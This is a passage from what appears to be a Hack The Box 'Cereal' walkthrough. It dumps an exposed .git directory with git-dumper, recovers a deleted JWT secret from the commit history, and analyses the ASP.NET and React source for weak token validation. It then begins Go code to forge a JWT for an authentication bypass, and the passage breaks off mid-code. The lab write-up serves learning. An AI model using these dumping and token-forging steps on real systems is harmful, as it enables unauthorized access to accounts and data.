<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ mkdir loot/source-cereal-git <span class="o">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/ <span class="o">[</span>403<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching common files
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.gitignore <span class="o">[</span>404<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span class="o">[</span>404<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/description <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Finding refs/
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span class="o">[</span>404<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/config <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span class="o">[</span>404<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Finding packs
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Finding objects
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching objects
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Running git checkout .
</span></span></code></pre></div><h4 id="git-history">Git History</h4>
<p>I could see the history of this repository by issuing <code>git log</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  /></div>
</p>
<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
<p><div class="img-container"><img src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  /></div>
</p>
<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
<ul>
<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
</ul>
<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
<blockquote>
<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
</blockquote>
<h4 id="app-overview">App Overview</h4>
<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «source-cereal-git» «10.10.14.3» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ tree -L <span class="m">1</span> --dirsfirst
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── ClientApp
</span></span><span class="line"><span class="cl">├── Controllers
</span></span><span class="line"><span class="cl">├── Migrations
</span></span><span class="line"><span class="cl">├── Models
</span></span><span class="line"><span class="cl">├── Pages
</span></span><span class="line"><span class="cl">├── Properties
</span></span><span class="line"><span class="cl">├── Services
</span></span><span class="line"><span class="cl">├── ApplicationOptions.cs
</span></span><span class="line"><span class="cl">├── appsettings.Development.json
</span></span><span class="line"><span class="cl">├── appsettings.json
</span></span><span class="line"><span class="cl">├── CerealContext.cs
</span></span><span class="line"><span class="cl">├── Cereal.csproj
</span></span><span class="line"><span class="cl">├── DownloadHelper.cs
</span></span><span class="line"><span class="cl">├── ExtensionMethods.cs
</span></span><span class="line"><span class="cl">├── IPAddressHandler.cs
</span></span><span class="line"><span class="cl">├── IPRequirement.cs
</span></span><span class="line"><span class="cl">├── Program.cs
</span></span><span class="line"><span class="cl">└── Startup.cs
</span></span></code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
<p>Here is the overview of app execution flow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Program.cs
</span></span><span class="line"><span class="cl"> |
</span></span><span class="line"><span class="cl"> v
</span></span><span class="line"><span class="cl">Startup.cs  -&gt; Loads appsettings.json
</span></span><span class="line"><span class="cl"> |
</span></span><span class="line"><span class="cl"> v
</span></span><span class="line"><span class="cl">React client
</span></span></code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
<ul>
<li>There is IP whitelist</li>
<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="err">...&lt;SNIP&gt;...</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;AllowedHosts&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ApplicationOptions&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Whitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;IpRateLimiting&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;EnableEndpointRateLimiting&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;StackBlockedRequests&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;RealIpHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-Real-IP&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;ClientIdHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-ClientId&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;HttpStatusCode&#34;</span><span class="p">:</span> <span class="mi">429</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;IpWhitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;EndpointWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;ClientWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;GeneralRules&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;post:/requests&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">150</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">services</span><span class="p">.</span><span class="n">AddAuthentication</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">DefaultAuthenticateScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">DefaultChallengeScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">AddJwtBearer</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">RequireHttpsMetadata</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">SaveToken</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">.</span><span class="n">TokenValidationParameters</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TokenValidationParameters</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ValidateIssuerSigningKey</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">IssuerSigningKey</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">ValidateIssuer</span> <span class="p">=</span> <span class="k">false</span><span class="p">,</span> <span class="c1">// &lt;== No validation</span>
</span></span><span class="line"><span class="cl">            <span class="n">ValidateAudience</span> <span class="p">=</span> <span class="k">false</span> <span class="c1">// &lt;== No validation</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span></code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">public</span> <span class="n">User</span> <span class="n">Authenticate</span><span class="p">(</span><span class="kt">string</span> <span class="n">username</span><span class="p">,</span> <span class="kt">string</span> <span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">user</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Users</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">Username</span> <span class="p">==</span> <span class="n">username</span> <span class="p">&amp;&amp;</span> <span class="n">x</span><span class="p">.</span><span class="n">Password</span> <span class="p">==</span> <span class="n">password</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1">// return null if user not found</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">user</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1">// authentication successful so generate jwt token</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">tokenHandler</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JwtSecurityTokenHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">tokenDescriptor</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SecurityTokenDescriptor</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">Subject</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ClaimsIdentity</span><span class="p">(</span><span class="k">new</span> <span class="n">Claim</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">                    <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">new</span> <span class="n">Claim</span><span class="p">(</span><span class="n">ClaimTypes</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">UserId</span><span class="p">.</span><span class="n">ToString</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">Expires</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">UtcNow</span><span class="p">.</span><span class="n">AddDays</span><span class="p">(</span><span class="m">7</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">SigningCredentials</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SigningCredentials</span><span class="p">(</span><span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">SecurityAlgorithms</span><span class="p">.</span><span class="n">HmacSha256Signature</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">};</span>
</span></span><span class="line"><span class="cl">                <span class="kt">var</span> <span class="n">token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">CreateToken</span><span class="p">(</span><span class="n">tokenDescriptor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">user</span><span class="p">.</span><span class="n">Token</span> <span class="p">=</span> <span class="n">tokenHandler</span><span class="p">.</span><span class="n">WriteToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">user</span><span class="p">.</span><span class="n">WithoutPassword</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), username, and token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">class</span> <span class="nc">User</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="na">        [Key]</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">int</span> <span class="n">UserId</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="na">        [Required]</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">string</span> <span class="n">Username</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="na">        [Required]</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">string</span> <span class="n">Password</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">string</span> <span class="n">Token</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span></code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
<blockquote>
<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">authenticationService</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;../_services&#39;</span><span class="p">;</span> <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">LoginPage</span> <span class="kr">extends</span> <span class="nx">React</span><span class="p">.</span><span class="nx">Component</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">constructor</span><span class="p">(</span><span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">super</span><span class="p">(</span><span class="nx">props</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// redirect to home if already logged in
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">authenticationService</span><span class="p">.</span><span class="nx">currentUserValue</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">history</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">render</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Login</span><span class="o">&lt;</span><span class="err">/h2&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</span></span></code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">currentUserSubject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BehaviorSubject</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;currentUser&#39;</span><span class="p">)));</span> <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">const</span> <span class="nx">authenticationService</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">login</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">logout</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">currentUser</span><span class="o">:</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">asObservable</span><span class="p">(),</span><span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">get</span> <span class="nx">currentUserValue</span> <span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">currentUserSubject</span><span class="p">.</span><span class="nx">value</span> <span class="p">}</span> <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
</span></span></code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
<p>I could summarize the previous code analysis to these points:</p>
<ul>
<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
<ul>
<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
</ul>
</li>
</ul>
<p>And here are the tactics to bypass the login page:</p>
<ul>
<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
<li>Simply refresh the page afterwards and see if it logs me in.</li>
</ul>
<h4 id="forge-jwt">Forge JWT</h4>
<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang. Here is the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;encoding/json&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;time&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">UserService</span> <span class="kd">interface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">CreateToken</span><span class="p">(</span><span class="nx">userID</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">jwtService</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">secretKey</span> <span class="kt">string</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">jwtService</span><span class="p">)</span> <span class="nf">CreateToken</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">claims</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ExpiresAt</span><span class="p">:</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">AddDate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">).</span><span class="nf">UTC</span><span class="p">().</span><span class="nf">Unix</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">t</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">secretKey</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">t</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">User</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">UserId</span>   <span class="kt">string</span> <span class="s">`json:&#34;userId,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Username</span> <span class="kt">string</span> <span class="s">`json:&#34;username,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Token</span>    <span class="kt">string</span> <span class="s">`json:&#34;token,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">jwt</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">jwtService</span><span class="p">{}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">jwt</span><span class="p">.</span><span class="nx">secretKey</span> <span class="p">=</span> <span class="s">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">cu</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{</span>
